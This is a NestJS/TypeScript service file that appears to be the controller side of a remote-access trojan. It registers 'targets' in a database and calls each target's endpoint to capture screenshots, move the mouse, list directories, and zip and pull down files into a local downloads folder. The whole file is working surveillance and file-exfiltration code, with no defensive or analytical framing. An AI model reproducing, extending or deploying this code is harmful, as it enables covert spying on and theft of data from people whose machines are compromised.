import { Injectable } from '@nestjs/common';
import { CreateTargetDto } from './dto/create-target.dto';
import { InjectModel } from '@nestjs/mongoose';
import { Target } from './schemas/target.schema';
import { Model } from 'mongoose';
import { HttpService } from '@nestjs/axios/dist';
import * as sharp from 'sharp';
import { promises as fs } from 'fs';

@Injectable()
export class TargetService {
  constructor(
    @InjectModel(Target.name) private targetModel: Model<Target>,
    private readonly httpService: HttpService,
  ) {}

  async create(createTargetDto: CreateTargetDto): Promise<Target> {
    const { access_url, os } = createTargetDto;
    const existingTarget = await this.targetModel.findOne({ access_url });
    if (!existingTarget) {
      console.log(
        `[+] New (${os}) Target with access url : ${access_url} added to DB!`,
      );
      return this.targetModel.create(createTargetDto);
    }
  }

  findTargetById(id: string): Promise<Target> {
    return this.targetModel.findById(id);
  }

  findAll(): Promise<Target[]> {
    return this.targetModel.find({});
  }

  async takeScreenshot(target: Target) {
    const { _id, access_url } = target;
    const response = await this.httpService.axiosRef.get(
      `${access_url}/screen-shot`,
      {
        responseType: 'arraybuffer',
      },
    );
    const img = response.data;
    await sharp(img).toFile(
      `./screen-shots/${Date.now()}-${_id}-screenshot.png`,
    );
    return {
      status: 'success',
      message: 'screenshot saved successfully.',
    };
  }
  async moveMouse(target: Target, x: string, y: string) {
    const { access_url } = target;
    await this.httpService.axiosRef.post(`${access_url}/move-mouse`, {
      x,
      y,
    });
    return {
      status: 'success',
      message: 'Mouse moved successfully.',
    };
  }
  async getListOfDirectory(target: Target, path: string) {
    const { access_url } = target;
    const response = await this.httpService.axiosRef.get(
      `${access_url}/give-ls`,
      {
        params: {
          path,
        },
      },
    );
    return response.data;
  }
  async downloadFiles(target: Target, path: string) {
    const { _id, access_url } = target;
    const response = await this.httpService.axiosRef.get(
      `${access_url}/create-zip`,
      {
        params: {
          path,
        },
        responseType: 'arraybuffer',
      },
    );
    const sanitizedPath = path.replace(/[\/\\]/g, '+');
    await fs.writeFile(
      `./downloads/${Date.now()}-${String(_id)}-${sanitizedPath}.zip`,
      response.data,
    );
    return {
      status: 'success',
      message: 'Files zipped successfully.',
    };
  }
}
